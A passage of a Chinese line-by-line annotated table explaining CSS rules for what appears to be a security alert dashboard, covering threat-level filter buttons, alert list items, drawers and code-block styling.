| 853 | 空行：分隔样式规则。 | `&nbsp;` |
| 854 | 选择器：指定接下来要设置样式的页面元素。 | `.timeline__time {` |
| 855 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 856 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 857 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 858 | 样式属性：设置 `margin-right` 的视觉或布局效果。 | `  margin-right: var(--space-sm);` |
| 859 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 860 | 空行：分隔样式规则。 | `&nbsp;` |
| 861 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 862 | 样式注释：说明这一段 CSS 的用途。 | ` * 页眉 / 页面说明` |
| 863 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 864 | 选择器：指定接下来要设置样式的页面元素。 | `.page-header {` |
| 865 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 866 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: flex-end;` |
| 867 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 868 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 869 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 870 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 871 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 872 | 空行：分隔样式规则。 | `&nbsp;` |
| 873 | 选择器：指定接下来要设置样式的页面元素。 | `.page-header__meta {` |
| 874 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 875 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-lg);` |
| 876 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 877 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 878 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 879 | 空行：分隔样式规则。 | `&nbsp;` |
| 880 | 选择器：指定接下来要设置样式的页面元素。 | `.page-header__meta strong {` |
| 881 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 882 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 883 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 884 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 885 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 886 | 空行：分隔样式规则。 | `&nbsp;` |
| 887 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 888 | 样式注释：说明这一段 CSS 的用途。 | ` * 筛选栏 / Segmented Control — DESIGN.md §8.2（4 色等级按钮组）` |
| 889 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 890 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar {` |
| 891 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 892 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 893 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md) var(--space-lg);` |
| 894 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: flex-end;` |
| 895 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 896 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 897 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 898 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 899 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-md);` |
| 900 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 901 | 空行：分隔样式规则。 | `&nbsp;` |
| 902 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar__group {` |
| 903 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 904 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 905 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 906 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 907 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 908 | 空行：分隔样式规则。 | `&nbsp;` |
| 909 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar__label {` |
| 910 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 911 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 912 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 913 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 914 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 915 | 空行：分隔样式规则。 | `&nbsp;` |
| 916 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar__spacer {` |
| 917 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 918 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 919 | 空行：分隔样式规则。 | `&nbsp;` |
| 920 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group {` |
| 921 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 922 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 923 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 924 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 3px;` |
| 925 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 926 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 927 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 928 | 空行：分隔样式规则。 | `&nbsp;` |
| 929 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn {` |
| 930 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 30px;` |
| 931 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 4px 12px;` |
| 932 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 933 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: transparent;` |
| 934 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 935 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 936 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 937 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 938 | 空行：分隔样式规则。 | `&nbsp;` |
| 939 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn:hover:not(:disabled) {` |
| 940 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 941 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 942 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 943 | 空行：分隔样式规则。 | `&nbsp;` |
| 944 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn.is-active {` |
| 945 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 946 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 947 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: inset 0 0 0 1px var(--border-default);` |
| 948 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 949 | 空行：分隔样式规则。 | `&nbsp;` |
| 950 | 样式注释：说明这一段 CSS 的用途。 | `/* 4 色段控：激活态按等级着色 */` |
| 951 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn--level-low.is-active {` |
| 952 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-low);` |
| 953 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: inset 0 0 0 1px rgba(59, 130, 246, 0.45);` |
| 954 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(59, 130, 246, 0.12);` |
| 955 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 956 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn--level-medium.is-active {` |
| 957 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 958 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: inset 0 0 0 1px rgba(245, 158, 11, 0.45);` |
| 959 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.12);` |
| 960 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 961 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn--level-high.is-active {` |
| 962 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 963 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: inset 0 0 0 1px rgba(239, 68, 68, 0.45);` |
| 964 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.12);` |
| 965 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 966 | 选择器：指定接下来要设置样式的页面元素。 | `.btn-group .btn--level-critical.is-active {` |
| 967 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-critical);` |
| 968 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: inset 0 0 0 1px rgba(236, 72, 153, 0.45);` |
| 969 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(236, 72, 153, 0.12);` |
| 970 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 971 | 空行：分隔样式规则。 | `&nbsp;` |
| 972 | 样式语句：参与页面视觉布局。 | `.filter-bar .form-input,` |
| 973 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar .form-select {` |
| 974 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 34px;` |
| 975 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 160px;` |
| 976 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 977 | 空行：分隔样式规则。 | `&nbsp;` |
| 978 | 选择器：指定接下来要设置样式的页面元素。 | `.filter-bar__search {` |
| 979 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1 1 220px;` |
| 980 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 180px;` |
| 981 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 982 | 空行：分隔样式规则。 | `&nbsp;` |
| 983 | 选择器：指定接下来要设置样式的页面元素。 | `.chip {` |
| 984 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 985 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 986 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 6px;` |
| 987 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 2px 8px;` |
| 988 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 989 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 990 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 991 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 992 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 999px;` |
| 993 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 994 | 空行：分隔样式规则。 | `&nbsp;` |
| 995 | 选择器：指定接下来要设置样式的页面元素。 | `.chip__close {` |
| 996 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: none;` |
| 997 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: none;` |
| 998 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 999 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1000 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 1001 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1;` |
| 1002 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 0;` |
| 1003 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1004 | 空行：分隔样式规则。 | `&nbsp;` |
| 1005 | 选择器：指定接下来要设置样式的页面元素。 | `.chip__close:hover {` |
| 1006 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1007 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1008 | 空行：分隔样式规则。 | `&nbsp;` |
| 1009 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1010 | 样式注释：说明这一段 CSS 的用途。 | ` * 告警列表项 — 扩展（可点击 + 选中 + 入场）` |
| 1011 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1012 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--clickable {` |
| 1013 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1014 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1015 | 空行：分隔样式规则。 | `&nbsp;` |
| 1016 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--clickable:focus-visible {` |
| 1017 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: 2px solid var(--accent-emerald);` |
| 1018 | 样式属性：设置 `outline-offset` 的视觉或布局效果。 | `  outline-offset: 2px;` |
| 1019 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1020 | 空行：分隔样式规则。 | `&nbsp;` |
| 1021 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item.is-active {` |
| 1022 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--accent-emerald);` |
| 1023 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 1024 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1025 | 空行：分隔样式规则。 | `&nbsp;` |
| 1026 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--new {` |
| 1027 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: slide-in 0.3s ease-out both;` |
| 1028 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1029 | 空行：分隔样式规则。 | `&nbsp;` |
| 1030 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__title-row {` |
| 1031 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1032 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1033 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1034 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 1035 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1036 | 空行：分隔样式规则。 | `&nbsp;` |
| 1037 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__title-row .badge {` |
| 1038 | 样式属性：设置 `flex-shrink` 的视觉或布局效果。 | `  flex-shrink: 0;` |
| 1039 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1040 | 空行：分隔样式规则。 | `&nbsp;` |
| 1041 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__summary {` |
| 1042 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1043 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1044 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 2px 0 4px;` |
| 1045 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 1046 | 样式属性：设置 `text-overflow` 的视觉或布局效果。 | `  text-overflow: ellipsis;` |
| 1047 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 1048 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1049 | 空行：分隔样式规则。 | `&nbsp;` |
| 1050 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__status {` |
| 1051 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1052 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1053 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1054 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 1055 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1056 | 空行：分隔样式规则。 | `&nbsp;` |
| 1057 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__status--open {` |
| 1058 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 1059 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1060 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__status--acknowledged {` |
| 1061 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 1062 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1063 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__status--resolved {` |
| 1064 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 1065 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1066 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__status--ignored {` |
| 1067 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1068 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1069 | 空行：分隔样式规则。 | `&nbsp;` |
| 1070 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1071 | 样式注释：说明这一段 CSS 的用途。 | ` * 抽屉扩展：footer / kv-grid / section / code-block` |
| 1072 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1073 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__title {` |
| 1074 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1075 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1076 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1077 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1078 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h3);` |
| 1079 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1080 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 1081 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1082 | 空行：分隔样式规则。 | `&nbsp;` |
| 1083 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__title-text {` |
| 1084 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 1085 | 样式属性：设置 `text-overflow` 的视觉或布局效果。 | `  text-overflow: ellipsis;` |
| 1086 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 1087 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1088 | 空行：分隔样式规则。 | `&nbsp;` |
| 1089 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__close {` |
| 1090 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: none;` |
| 1091 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: none;` |
| 1092 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1093 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: 20px;` |
| 1094 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1;` |
| 1095 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 4px 8px;` |
| 1096 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1097 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-sm);` |
| 1098 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1099 | 空行：分隔样式规则。 | `&nbsp;` |
| 1100 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__close:hover {` |
| 1101 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1102 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1103 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1104 | 空行：分隔样式规则。 | `&nbsp;` |
| 1105 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__footer {` |
| 1106 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 1107 | 样式属性：设置 `border-top` 的视觉或布局效果。 | `  border-top: 1px solid var(--border-subtle);` |
| 1108 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1109 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 1110 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1111 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: flex-end;` |
| 1112 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 1113 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1114 | 空行：分隔样式规则。 | `&nbsp;` |
| 1115 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__section {` |
| 1116 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 1117 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1118 | 空行：分隔样式规则。 | `&nbsp;` |
| 1119 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__section-title {` |
| 1120 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1121 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1122 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1123 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 1124 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-sm);` |
| 1125 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1126 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1127 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1128 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1129 | 空行：分隔样式规则。 | `&nbsp;` |
| 1130 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__section-title::before {` |
| 1131 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "";` |
| 1132 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-block;` |
| 1133 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 2px;` |
| 1134 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 12px;` |
| 1135 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 1136 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 1px;` |
| 1137 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1138 | 空行：分隔样式规则。 | `&nbsp;` |
| 1139 | 选择器：指定接下来要设置样式的页面元素。 | `.kv-grid {` |
| 1140 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1141 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: 120px 1fr;` |
| 1142 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 6px var(--space-md);` |
| 1143 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 1144 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1145 | 空行：分隔样式规则。 | `&nbsp;` |
| 1146 | 选择器：指定接下来要设置样式的页面元素。 | `.kv-grid dt {` |
| 1147 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1148 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1149 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1150 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 1151 | 样式属性：设置 `padding-top` 的视觉或布局效果。 | `  padding-top: 2px;` |
| 1152 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1153 | 空行：分隔样式规则。 | `&nbsp;` |
| 1154 | 选择器：指定接下来要设置样式的页面元素。 | `.kv-grid dd {` |
| 1155 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1156 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1157 | 样式属性：设置 `word-break` 的视觉或布局效果。 | `  word-break: break-all;` |
| 1158 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1159 | 空行：分隔样式规则。 | `&nbsp;` |
| 1160 | 选择器：指定接下来要设置样式的页面元素。 | `.kv-grid dd.mono {` |
| 1161 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1162 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 1163 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 1164 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1165 | 空行：分隔样式规则。 | `&nbsp;` |
| 1166 | 选择器：指定接下来要设置样式的页面元素。 | `.code-block {` |
| 1167 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1168 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 1169 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 1170 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 1171 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 1172 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1173 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 1174 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1175 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: pre-wrap;` |
| 1176 | 样式属性：设置 `word-break` 的视觉或布局效果。 | `  word-break: break-word;` |
| 1177 | 样式属性：设置 `max-height` 的视觉或布局效果。 | `  max-height: 260px;` |
| 1178 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: auto;` |
| 1179 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1180 | 空行：分隔样式规则。 | `&nbsp;` |
| 1181 | 选择器：指定接下来要设置样式的页面元素。 | `.feature-table {` |
| 1182 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 1183 | 样式属性：设置 `border-collapse` 的视觉或布局效果。 | `  border-collapse: collapse;` |
| 1184 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1185 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1186 | 空行：分隔样式规则。 | `&nbsp;` |
| 1187 | 样式语句：参与页面视觉布局。 | `.feature-table th,` |
| 1188 | 选择器：指定接下来要设置样式的页面元素。 | `.feature-table td {` |
| 1189 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: left;` |
| 1190 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 6px var(--space-sm);` |
| 1191 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 1192 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1193 | 空行：分隔样式规则。 | `&nbsp;` |
| 1194 | 选择器：指定接下来要设置样式的页面元素。 | `.feature-table th {` |
| 1195 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1196 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1197 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
